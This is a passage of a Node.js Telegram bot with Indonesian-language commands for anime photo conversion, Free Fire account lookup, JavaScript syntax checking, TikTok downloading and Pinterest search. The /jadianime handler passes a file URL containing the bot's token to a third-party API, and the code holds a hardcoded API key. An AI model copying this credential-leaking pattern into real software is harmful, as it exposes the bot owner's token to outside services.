        });

    } catch (err) {
        console.error(err);

        bot.sendMessage(
            msg.chat.id,
            `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ.</blockquote>`,
            {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            }
        );
    }
});

bot.onText(/^\/jadianime$/i, async (msg) => {
    try {
        const chatId = msg.chat.id;
        const reply = msg.reply_to_message;

        if (!reply || !reply.photo) {
            return bot.sendMessage(
                chatId,
                `<blockquote>❌ ʀᴇᴘʟʏ sᴇʙᴜᴀʜ ɢᴀᴍʙᴀʀ.</blockquote>

<blockquote>ᴄᴏɴᴛᴏʜ :</blockquote>

<blockquote>ʀᴇᴘʟʏ ғᴏᴛᴏ ᴋᴇᴍᴜᴅɪᴀɴ ᴋɪʀɪᴍ /ᴊᴀᴅɪᴀɴɪᴍᴇ</blockquote>`,
                {
                    parse_mode: "HTML",
                    reply_to_message_id: msg.message_id
                }
            );
        }

        const fileId = reply.photo[reply.photo.length - 1].file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;

        const loading = await bot.sendMessage(
            chatId,
            `<blockquote>⏳ sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs ɢᴀᴍʙᴀʀ...</blockquote>`,
            {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            }
        );

        const { data } = await axios.get(
            "https://api.ikyyxd.my.id/edit/nanobananav3",
            {
                params: {
                    prompt: "ubah foto ini menjadi anime",
                    url: fileUrl
                }
            }
        );

        if (!data.status) {
            return bot.editMessageText(
                `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇᴍᴘʀᴏsᴇs ɢᴀᴍʙᴀʀ.</blockquote>`,
                {
                    chat_id: chatId,
                    message_id: loading.message_id,
                    parse_mode: "HTML"
                }
            );
        }

        await bot.deleteMessage(chatId, loading.message_id).catch(() => {});

        bot.sendPhoto(chatId, data.result.result_url, {
            caption: `<blockquote>✅ ʙᴇʀʜᴀsɪʟ ᴍᴇɴɢᴜʙᴀʜ ғᴏᴛᴏ ᴍᴇɴᴊᴀᴅɪ ᴀɴɪᴍᴇ.</blockquote>`,
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "ᴄʀᴇᴀᴛᴏʀ",
                            url: "https://t.me/heysaka",
                            style: "success",
                            icon_custom_emoji_id: "5319301933645707826"
                        }
                    ]
                ]
            }
        });

    } catch (err) {
        console.error(err);

        bot.sendMessage(
            msg.chat.id,
            `<blockquote>❌ ᴛᴇʀᴊᴀᴅɪ ᴋᴇsᴀʟᴀʜᴀɴ.</blockquote>`,
            {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            }
        );
    }
});

bot.onText(/^\/(stalkff|epep|ff)(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const uid = match[2] ? match[2].trim() : "";

    if (!uid) {
        return bot.sendMessage(
            chatId,
            `<blockquote>⚠️ ᴍᴀsᴜᴋᴋᴀɴ ᴜɪᴅ ғʀᴇᴇ ғɪʀᴇ.</blockquote>

<blockquote>ᴄᴏɴᴛᴏʜ :</blockquote>

<blockquote>/sᴛᴀʟᴋғғ 2400235763</blockquote>`,
            {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id
            }
        );
    }

    const waitMsg = await bot.sendMessage(
        chatId,
        `<blockquote>🔍 sᴇᴅᴀɴɢ ᴍᴇɴɢᴇᴄᴇᴋ ᴅᴀᴛᴀ ᴀᴋᴜɴ ғʀᴇᴇ ғɪʀᴇ...</blockquote>`,
        {
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id
        }
    );

    try {
        await bot.sendChatAction(chatId, "upload_photo");

        const apiUrl = `https://api.ikyyxd.my.id/stalk/epepid?uid=${encodeURIComponent(uid)}`;
        const { data } = await axios.get(apiUrl, {
            timeout: 15000
        });

        if (!data || !data.status || !data.data) {
            return bot.editMessageText(
                `<blockquote>❌ ᴅᴀᴛᴀ ᴜɪᴅ ${uid} ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ.</blockquote>`,
                {
                    chat_id: chatId,
                    message_id: waitMsg.message_id,
                    parse_mode: "HTML"
                }
            );
        }

        const res = data.data;

        const nickname = res.name || "-";
        const idAcc = res.uid || uid;
        const level = res.level || "-";
        const region = res.region || "-";
        const likes = res.Likes || "-";
        const brRankPoint = res.br_rank_point || "-";
        const csRankPoint = res.cs_rank_point || "-";
        const guildName = res.guild_name || "-";
        const bannerImg = res.banner_image;

        await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

        const captionText =
`<blockquote>🎮 sᴛᴀʟᴋ ғʀᴇᴇ ғɪʀᴇ</blockquote>

<blockquote>👤 ɴɪᴄᴋɴᴀᴍᴇ : ${nickname}</blockquote>

<blockquote>🆔 ᴜɪᴅ : ${idAcc}</blockquote>

<blockquote>🎖️ ʟᴇᴠᴇʟ : ${level}</blockquote>

<blockquote>📍 ʀᴇɢɪᴏɴ : ${region}</blockquote>

<blockquote>👍 ʟɪᴋᴇs : ${likes}</blockquote>

<blockquote>🏆 ʙʀ ᴘᴏɪɴᴛ : ${brRankPoint}</blockquote>

<blockquote>⚔️ ᴄs ᴘᴏɪɴᴛ : ${csRankPoint}</blockquote>

<blockquote>🏰 ɢᴜɪʟᴅ : ${guildName}</blockquote>`;

        if (bannerImg) {
            await bot.sendPhoto(chatId, bannerImg, {
                caption: captionText,
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "ᴄʀᴇᴀᴛᴏʀ",
                                url: "https://t.me/heysaka",
                                style: "success",
                                icon_custom_emoji_id: "5319301933645707826"
                            }
                        ]
                    ]
                }
            }).catch(async () => {
                await bot.sendMessage(chatId, captionText, {
                    parse_mode: "HTML",
                    reply_to_message_id: msg.message_id,
                    reply_markup: {
                        inline_keyboard: [
                            [
                                {
                                    text: "ᴄʀᴇᴀᴛᴏʀ",
                                    url: "https://t.me/heysaka",
                                    style: "success",
                                    icon_custom_emoji_id: "5319301933645707826"
                                }
                            ]
                        ]
                    }
                });
            });
        } else {
            await bot.sendMessage(chatId, captionText, {
                parse_mode: "HTML",
                reply_to_message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "ᴄʀᴇᴀᴛᴏʀ",
                                url: "https://t.me/heysaka",
                                style: "success",
                                icon_custom_emoji_id: "5319301933645707826"
                            }
                        ]
                    ]
                }
            });
        }

    } catch (error) {
        console.error("Error /stalkff command:", error.message);

        await bot.editMessageText(
            `<blockquote>❌ ɢᴀɢᴀʟ ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴀᴛᴀ ᴀᴋᴜɴ.</blockquote>

<blockquote>sɪʟᴀʜᴋᴀɴ ᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ.</blockquote>`,
            {
                chat_id: chatId,
                message_id: waitMsg.message_id,
                parse_mode: "HTML"
            }
        ).catch(() => {});
    }
});

function toSmallCaps(text) {
    const map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ', 'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ', 's': 'ꜱ', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ', 'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ', 'S': 'ꜱ', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ'
    };
    return text.split('').map(ch => map[ch] || ch).join('');
}

function escapeHtml(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

bot.onText(/\/cekfunc/, async (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";
    const token = bot.token;

    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, "<blockquote>❌ ɢᴀɢᴀʟ. ꜱɪʟᴀᴋᴀɴ ʀᴇᴘʟʏ ᴋᴇ ᴘᴇꜱᴀɴ ᴛᴇᴋꜱ ᴋᴏᴅɪɴɢᴀɴ ᴀᴛᴀᴜ ᴋᴇ ꜰɪʟᴇ (.ᴊꜱ) ᴋᴏᴅɪɴɢᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴɢᴇᴛɪᴋ /ᴄᴇᴋꜰᴜɴᴄ</blockquote>", { parse_mode: "HTML" });
    }

    let codeToCheck = "";
    let funcName = "";
    const replyMsg = msg.reply_to_message;

    try {
        const prosesMsg = await bot.sendSticker(chatId, "CAACAgIAAxkBAAEruXhqSMtyQ-jLc3Kym-SkdNz4SxG92gACtCMAAphLKUjeub7NKlvk2TwE");

        if (replyMsg.document) {
            const doc = replyMsg.document;
            funcName = doc.file_name || "file.js";
            if (!funcName.endsWith('.js')) {
                await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
                return bot.sendMessage(chatId, "<blockquote>❌ ꜰɪʟᴇ ʏᴀɴɢ ᴅɪ-ʀᴇᴘʟʏ ʜᴀʀᴜꜱ ʙᴇʀꜰᴏʀᴍᴀᴛ ᴊᴀᴠᴀꜱᴄʀɪᴘᴛ (.ᴊꜱ)</blockquote>", { parse_mode: "HTML" });
            }
            const fileStream = bot.getFileStream(doc.file_id);
            const chunks = [];
            for await (const chunk of fileStream) chunks.push(chunk);
            codeToCheck = Buffer.concat(chunks).toString("utf-8");
        } else if (replyMsg.text) {
            codeToCheck = replyMsg.text;
            funcName = "Teks reply";
        } else {
            await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
            return bot.sendMessage(chatId, "<blockquote>❌ ᴍᴇᴅɪᴀ ʏᴀɴɢ ᴅɪ-ʀᴇᴘʟʏ ᴛɪᴅᴀᴋ ᴅɪᴅᴜᴋᴜɴɢ. ʜᴀʀᴜꜱ ʙᴇʀᴜᴘᴀ ᴛᴇᴋꜱ ᴋᴏᴅɪɴɢᴀɴ ᴀᴛᴀᴜ ꜰɪʟᴇ .ᴊꜱ</blockquote>", { parse_mode: "HTML" });
        }

        const vm = require('vm');
        try {
            new vm.Script(codeToCheck, { filename: 'checked_file.js' });

            const successHtml = `<tg-collage>
<img src="https://ar-hosting.pages.dev/1785241507057.jpg"/>
</tg-collage>
<h3> ${toSmallCaps('✅ YEEY FUNCTION AMAN')} </h3>

<table border="2">
<tr><th>${toSmallCaps('Info')}</th><th>${toSmallCaps('Detail')}</th></tr>
<tr><td>${toSmallCaps('Command')}</td><td><code>/cekfunc</code></td></tr>
<tr><td>${toSmallCaps('Sumber')}</td><td><code>${toSmallCaps(escapeHtml(funcName))}</code></td></tr>
<tr><td>${toSmallCaps('Status')}</td><td>${toSmallCaps('Function aman')}</td></tr>
<tr><td>${toSmallCaps('CREATED')}</td><td>${toSmallCaps(escapeHtml(username))}</td></tr>
</table>

<ul>
  <li><input type="checkbox" checked> ${toSmallCaps('Syntax function valid')}</li>
  <li><input type="checkbox" checked> ${toSmallCaps('Tidak ada error terdeteksi')}</li>
</ul>
`;

            await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
            await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
                chat_id: chatId,
                reply_parameters: { message_id: msg.message_id },
                rich_message: { html: successHtml },
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            });

        } catch (syntaxError) {
            const stack = syntaxError.stack || "";
            const lines = stack.split('\n');
            let lineNum = 1, colNum = 1;
            const matchLine = lines[0] ? lines[0].match(/checked_file\.js:(\d+)/) : null;
            if (matchLine) lineNum = parseInt(matchLine[1]);
            if (lines[2]) {
                const caretIdx = lines[2].indexOf('^');
                if (caretIdx !== -1) colNum = caretIdx + 1;
            }
            const codeLines = codeToCheck.split('\n');
            const startLine = Math.max(1, lineNum - 3);
            const endLine = Math.min(codeLines.length, lineNum + 3);
            let snippetRows = "";
            for (let i = startLine; i <= endLine; i++) {
                const isTarget = i === lineNum;
                const linePrefix = isTarget ? `👉 <b>${i}</b>` : `${i}`;
                const lineContent = codeLines[i - 1] || "";
                snippetRows += `<tr><td>${linePrefix}</td><td><code>${escapeHtml(lineContent)}</code></td></tr>\n`;
            }

            const errorHtml = `<tg-collage>
<img src="https://ar-hosting.pages.dev/1785241507057.jpg"/>
</tg-collage>
<h3> ${toSmallCaps('❌ ERROR TERDETEKSI')} </h3>

<table border="2">
<tr><th>${toSmallCaps('Info')}</th><th>${toSmallCaps('Detail')}</th></tr>
<tr><td>${toSmallCaps('Command')}</td><td><code>/cekfunc</code></td></tr>
<tr><td>${toSmallCaps('Sumber')}</td><td>${toSmallCaps(escapeHtml(funcName))}</td></tr>
<tr><td>${toSmallCaps('Line')}</td><td><b>${lineNum}</b></td></tr>
<tr><td>${toSmallCaps('Column')}</td><td><b>${colNum}</b></td></tr>
<tr><td>${toSmallCaps('Error')}</td><td><code>${toSmallCaps(escapeHtml(syntaxError.message))}</code></td></tr>
</table><br/>

📌 <h3>${toSmallCaps('Cuplikan Kode')}</h3>
<table border="2">
<tr><th>${toSmallCaps('Line')}</th><th>${toSmallCaps('Code')}</th></tr>
${snippetRows}
</table>

<ul>
  <li><input type="checkbox"> ${toSmallCaps('Syntax function valid')}</li>
  <li><input type="checkbox"> ${toSmallCaps('Tidak ada error terdeteksi')}</li>
</ul>
`;

            await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
            await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
                chat_id: chatId,
                reply_parameters: { message_id: msg.message_id },
                rich_message: { html: errorHtml },
                reply_markup: {
                    inline_keyboard: [
                        [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
                    ]
                }
            });
        }

    } catch (globalError) {
        bot.sendMessage(chatId, toSmallCaps(`❌ Terjadi fatal error sistem saat membaca data: ${globalError.message}`));
    }
});
// ================= HELPER FORMATTING =================
function toSmallCaps(text) {
  if (!text) return "";
  const normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
  const small  = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ";
  
  return String(text).split('').map(char => {
    const index = normal.indexOf(char);
    return index !== -1 ? small[index] : char;
  }).join('');
}

function formatQuote(text) {
  return `<blockquote>${toSmallCaps(text)}</blockquote>`;
}

bot.onText(/^(?:\/tiktok(?:\s+\S+)?|https?:\/\/(?:vm\.tiktok\.com|vt\.tiktok\.com|www\.tiktok\.com)\/[^\s]+)$/, async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text.trim();

  const matchUrl = text.match(/(https?:\/\/(?:vm\.tiktok\.com|vt\.tiktok\.com|www\.tiktok\.com)\/[^\s]+)/);
  
  if (text.startsWith('/tiktok') && !matchUrl) {
    const petunjuk = `💡 CARA PENGGUNAAN TIKTOK DOWNLOADER\n\nSilakan gunakan perintah dengan menyertakan link/URL video TikTok yang ingin diunduh.\n\n📌 Contoh Penggunaan:\n/tiktok https://vt.tiktok.com/abcde123/\n\nℹ️ Tips: Kamu juga bisa langsung mengirimkan/paste link TikTok begitu saja ke chat ini tanpa harus mengetik /tiktok, bot akan otomatis mendeteksinya!`;

    return bot.sendMessage(chatId, formatQuote(petunjuk), { parse_mode: "HTML" });
  }

  if (!matchUrl) return;

  const url = matchUrl[1];

  const loadingMsg = await bot.sendMessage(chatId, formatQuote("⏳ Link TikTok terdeteksi, mohon tunggu..."), { parse_mode: "HTML" });

  const providers = [
    { name: "V3 (TikWM)", run: () => downloadV3(url, chatId) },
    { name: "V6 (HD Quality)", run: () => downloadV6(url, chatId) },
    { name: "V5 (Multi Complete)", run: () => downloadV5(url, chatId) },
    { name: "V1 (Support Slide)", run: () => downloadV1(url, chatId) },
    { name: "V2 (Support Slide)", run: () => downloadV2(url, chatId) },
    { name: "V4 (Backup)", run: () => downloadV4(url, chatId) }
  ];

  let success = false;

  for (const provider of providers) {
    try {
      console.log(`Mencoba Server ${provider.name}...`);
      success = await provider.run();
      if (success) {

        await bot.editMessageText(formatQuote(`✅ Sukses via Server ${provider.name}!`), { 
          chat_id: chatId, 
          message_id: loadingMsg.message_id,
          parse_mode: "HTML" 
        });
        setTimeout(() => {
          bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {});
        }, 3000);
        break;
      }
    } catch (err) {
      console.error(`Gagal di Server ${provider.name}:`, err.message);
    }
  }

  if (!success) {
    await bot.editMessageText(formatQuote("❌ Gagal mengunduh video TikTok. Semua server sedang down atau video diprivat."), { 
      chat_id: chatId, 
      message_id: loadingMsg.message_id,
      parse_mode: "HTML" 
    });
  }
});

async function downloadV3(url, chatId) {
  const { data } = await axios.get(`https://www.tikwm.com/api/`, { params: { url } });
  if (data.code !== 0) return false;

  const res = data.data;
  const rawCaption = `🎵 TikTok Downloader (V3)\n\n👤 Author : ${res.author.nickname}\n📌 Title : ${res.title || "No Title"}\n❤️ Likes : ${res.digg_count}\n💬 Comments : ${res.comment_count}\n🔁 Share : ${res.share_count}`;

  await bot.sendVideo(chatId, res.play, { caption: formatQuote(rawCaption), parse_mode: "HTML" });

  if (res.music) {
    await bot.sendAudio(chatId, res.music, {
      title: toSmallCaps(res.music_info?.title || "TikTok Audio"),
      performer: toSmallCaps(res.music_info?.author || "TikTok")
    });
  }
  return true;
}

async function downloadV6(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktokv4`, { params: { url } });
  if (!data.status) return false;

  const res = data.result;
  const rawCaption = `🎵 TikTok Downloader V6 (HD)\n\n👤 Author : ${res.author.nickname} (@${res.author.username})\n⏱ Duration : ${res.duration}s\n📦 Size : ${res.quality.size}\n📺 HD : ${res.quality.is_hd ? "Yes" : "No"}`;

  if (res.media?.nowm) {
    await bot.sendVideo(chatId, res.media.nowm, { caption: formatQuote(rawCaption), parse_mode: "HTML" });
  } else if (res.media?.wm) {
    await bot.sendVideo(chatId, res.media.wm, { caption: formatQuote(rawCaption + "\n🎬 (Watermark)"), parse_mode: "HTML" });
  }
  return true;
}

async function downloadV5(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktokv3`, { params: { url } });
  if (!data.status) return false;

  const res = data.result;
  const rawCaption = `🎵 TikTok Downloader V5\n\n👤 Author : ${res.creator.nickname} (@${res.creator.username})\n📌 Caption : ${res.caption || "-"}\n👁 Views : ${res.stats.views}\n❤️ Likes : ${res.stats.likes}`;

  if (res.download?.nowm) {
    await bot.sendVideo(chatId, res.download.nowm, { caption: formatQuote(rawCaption), parse_mode: "HTML" });
  } else if (res.download?.wm) {
    await bot.sendVideo(chatId, res.download.wm, { caption: formatQuote(rawCaption + "\n🎬 (Watermark)"), parse_mode: "HTML" });
  }

  if (res.download?.audio) {
    await bot.sendAudio(chatId, res.download.audio, { 
      title: toSmallCaps("TikTok Audio"), 
      performer: toSmallCaps(res.creator.nickname) 
    });
  }
  return true;
}

async function downloadV1(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktok`, { params: { apikey: "kyzz", query: url } });
  if (!data.status) return false;

  const res = data.result;
  const media = [];

  if (res.video) {
    media.push({ type: "video", media: res.video, caption: formatQuote("🎵 TikTok Video (V1)") });
  }

  if (res.slides?.length) {
    res.slides.forEach((sl, idx) => {
      media.push({
        type: "photo",
        media: sl.img_result,
        caption: idx === 0 && !res.video ? formatQuote("🎵 TikTok Slide (V1)") : undefined
      });
    });
  }

  for (let i = 0; i < media.length; i += 10) {
    const batch = media.slice(i, i + 10);
    if (batch.length === 1) {
      if (batch[0].type === "video") {
        await bot.sendVideo(chatId, batch[0].media, { caption: batch[0].caption, parse_mode: "HTML" });
      } else {
        await bot.sendPhoto(chatId, batch[0].media, { caption: batch[0].caption, parse_mode: "HTML" });
      }
    } else {
      await bot.sendMediaGroup(chatId, batch.map(m => ({ 
        type: m.type, 
        media: m.media, 
        caption: m.caption,
        parse_mode: "HTML"
      })));
    }
  }

  if (res.audio) {
    await bot.sendAudio(chatId, res.audio, { caption: formatQuote("🎵 Audio TikTok"), parse_mode: "HTML" });
  }
  return true;
}

async function downloadV2(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktokv2`, { params: { url } });
  if (!data.status) return false;

  const res = data.result;
  const media = [];

  res.video?.forEach(v => media.push({ type: "video", media: v }));
  res.audio?.forEach(a => media.push({ type: "audio", media: a }));

  const rawCaption = res.title ? `🎵 ${res.title}` : undefined;
  const videos = media.filter(m => m.type === "video");

  if (videos.length > 0) {
    for (let i = 0; i < videos.length; i += 10) {
      const slice = videos.slice(i, i + 10);
      await bot.sendMediaGroup(chatId, slice.map((m, idx) => ({
        type: "video",
        media: m.media,
        caption: i === 0 && idx === 0 && rawCaption ? formatQuote(rawCaption) : undefined,
        parse_mode: "HTML"
      })));
    }
  }

  const audios = media.filter(m => m.type === "audio");
  for (const a of audios) {
    await bot.sendAudio(chatId, a.media);
  }
  return true;
}

async function downloadV4(url, chatId) {
  const { data } = await axios.get(`https://tikdown.ikyzxz.my.id/api/v1`, { params: { url } });
  if (!data.status) return false;

  const res = data; 
  const rawCaption = `🎵 TikTok Downloader V4\n\n📌 Title : ${res.title || "No Title"}\n👤 Author : ${res.author || "Unknown"}`;

  if (!res.download?.nowm) return false;

  await bot.sendVideo(chatId, res.download.nowm, { caption: formatQuote(rawCaption), parse_mode: "HTML" });

  if (res.download?.mp3) {
    await bot.sendAudio(chatId, res.download.mp3, {
      title: toSmallCaps(res.title || "TikTok Audio"),
      performer: toSmallCaps(res.author || "TikTok")
    });
  }
  return true;
}

const pinMemory = {};

function toSmallCaps(text) {
  const map = {
    'a':'ᴀ','b':'ʙ','c':'ᴄ','d':'ᴅ','e':'ᴇ','f':'ꜰ','g':'ɢ','h':'ʜ','i':'ɪ',
    'j':'ᴊ','k':'ᴋ','l':'ʟ','m':'ᴍ','n':'ɴ','o':'ᴏ','p':'ᴘ','q':'ǫ','r':'ʀ',
    's':'ꜱ','t':'ᴛ','u':'ᴜ','v':'ᴠ','w':'ᴡ','x':'x','y':'ʏ','z':'ᴢ',
    'A':'ᴀ','B':'ʙ','C':'ᴄ','D':'ᴅ','E':'ᴇ','F':'ꜰ','G':'ɢ','H':'ʜ','I':'ɪ',
    'J':'ᴊ','K':'ᴋ','L':'ʟ','M':'ᴍ','N':'ɴ','O':'ᴏ','P':'ᴘ','Q':'ǫ','R':'ʀ',
    'S':'ꜱ','T':'ᴛ','U':'ᴜ','V':'ᴠ','W':'ᴡ','X':'x','Y':'ʏ','Z':'ᴢ'
  };
  return text.split('').map(c => map[c] || c).join('');
}

function blockQuote(text) {
  return `<blockquote>${toSmallCaps(text)}</blockquote>`;
}

bot.onText(/^\/pinterest(?:\s+(.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim();
  const replyOpt = {
    reply_to_message_id: msg.message_id,
    parse_mode: 'HTML'
  };

  if (!query) {
    return bot.sendMessage(
      chatId,
      blockQuote('❌ ᴍᴀsᴜᴋᴋᴀɴ ǫᴜᴇʀʏ!\n\n📌 ᴄᴏɴᴛᴏʜ:\n/pinterest anime girl\n/pinterest aesthetic wallpaper'),
      {
        ...replyOpt,
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const loading = await bot.sendMessage(
    chatId,
    blockQuote('🔎 ᴍᴇɴᴄᴀʀɪ ɢᴀᴍʙᴀʀ...'),
    { ...replyOpt, parse_mode: 'HTML' }
  );

  try {
    const { data } = await axios.get(
      'https://api.siputzx.my.id/api/s/pinterest',
      { params: { query, type: 'image' } }
    );

    if (!data?.data || data.data.length === 0) {
      await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
      return bot.sendMessage(
        chatId,
        blockQuote('❌ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!\n📌 ᴄᴏʙᴀ ᴋᴀᴛᴀ ʟᴀɪɴ: anime, wallpaper, aesthetic'),
        {
          ...replyOpt,
          reply_markup: {
            inline_keyboard: [
              [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
            ]
          }
        }
      );
    }

    const key = Math.random().toString(36).substring(2, 9);
    pinMemory[key] = {
      results: data.data.filter(v => v.image_url),
      index: 0,
      chatId,
      replyTo: msg.message_id
    };

    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    await sendPin(bot, chatId, key);

  } catch (err) {
    console.error(err);
    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    bot.sendMessage(
      chatId,
      blockQuote('❌ ᴇʀʀᴏʀ sᴀᴀᴛ ᴍᴇɴɢᴀᴍʙɪʟ ᴅᴀᴛᴀ!'),
      {
        ...replyOpt,
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }
});

bot.on('callback_query', async (callbackQuery) => {
  const data = callbackQuery.data;
  if (!data.startsWith('pin_next_')) return;

  const key = data.replace('pin_next_', '');
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;

  if (!pinMemory[key]) {
    return bot.answerCallbackQuery(callbackQuery.id, {
      text: toSmallCaps('❌ Sesi hangus, silahkan cari ulang!'),
      show_alert: true
    });
  }

  await bot.answerCallbackQuery(callbackQuery.id, {
    text: toSmallCaps('⏳ Mengambil 10 gambar berikutnya...')
  });

  await bot.deleteMessage(chatId, messageId).catch(() => {});
  await sendPin(bot, chatId, key);
});

// === SEND PIN ===
async function sendPin(bot, chatId, key) {
  const data = pinMemory[key];
  if (!data) {
    return bot.sendMessage(
      chatId,
      blockQuote('❌ ᴅᴀᴛᴀ ᴇxᴘɪʀᴇᴅ ᴀᴛᴀᴜ ᴛɪᴅᴀᴋ ᴅɪᴛᴇᴍᴜᴋᴀɴ!'),
      {
        reply_to_message_id: data?.replyTo,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const replyOpt = {
    reply_to_message_id: data.replyTo,
    parse_mode: 'HTML'
  };

  const start = data.index;
  const end = start + 10;
  const slice = data.results.slice(start, end);

  if (!slice.length) {
    return bot.sendMessage(
      chatId,
      blockQuote('❌ sᴇᴍᴜᴀ ɢᴀᴍʙᴀʀ sᴜᴅᴀʜ ᴅɪᴛᴀᴍᴘɪʟᴋᴀɴ!'),
      {
        ...replyOpt,
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const page = Math.floor(start / 10) + 1;
  const caption = blockQuote(`🐱 ᴘɪɴᴛᴇʀᴇsᴛ ʀᴇsᴜʟᴛ\n📌 ʜᴀʟᴀᴍᴀɴ: ${page}`);

  const media = slice.map((v, i) => ({
    type: 'photo',
    media: v.image_url,
    caption: i === 0 ? caption : undefined,
    parse_mode: 'HTML'
  }));

  try {
    await bot.sendMediaGroup(chatId, media);
    data.index += 10;

    if (data.index >= data.results.length) {
      return bot.sendMessage(
        chatId,
        blockQuote('✨ sᴇᴍᴜᴀ ɢᴀᴍʙᴀʀ ᴛᴇʟᴀʜ ᴅɪᴛᴀᴍᴘɪʟᴋᴀɴ.'),
        {
          ...replyOpt,
          reply_markup: {
            inline_keyboard: [
              [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
            ]
          }
        }
      );
    }

    return bot.sendMessage(
      chatId,
      blockQuote('➡️ ᴛᴀᴍᴘɪʟᴋᴀɴ 10 ɢᴀᴍʙᴀʀ ʙᴇʀɪᴋᴜᴛɴʏᴀ?'),
      {
        ...replyOpt,
        reply_markup: {
          inline_keyboard: [
            [{ text: 'ɴᴇxᴛ 10 ➡️', style: "success", callback_data: `pin_next_${key}` }],
